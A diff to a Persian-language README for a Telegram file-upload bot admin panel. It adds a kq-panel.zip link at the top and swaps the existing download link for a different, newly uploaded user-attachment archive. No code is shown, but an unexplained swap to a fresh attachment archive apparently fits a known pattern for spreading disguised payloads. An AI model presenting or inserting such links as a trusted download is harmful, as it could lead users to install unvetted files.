@@ -1,3 +1,4 @@
+[kq-panel.zip](https://github.com/user-attachments/files/29396963/kq-panel.zip)
 # 🤖 پنل مدریت ربات اپلود فایل 
 
 پنل مدیریت حرفه‌ای ربات تلگرام با قابلیت آپلود فایل و مدیریت کامل
@@ -26,8 +27,7 @@
 - 📊 لاگ لحظه‌ای
 
 ## 🛠️ نصب و راه‌اندازی
-
-[ 📦 **لینک دانلود .zip** ](https://github.com/user-attachments/files/29394413/kq-panel.zip)
+[[ 📦 **لینک دانلود .zip** ]](https://github.com/user-attachments/files/29396966/kq-panel.zip)
 
 ### پیش‌نیازها
 - Python 3.8+
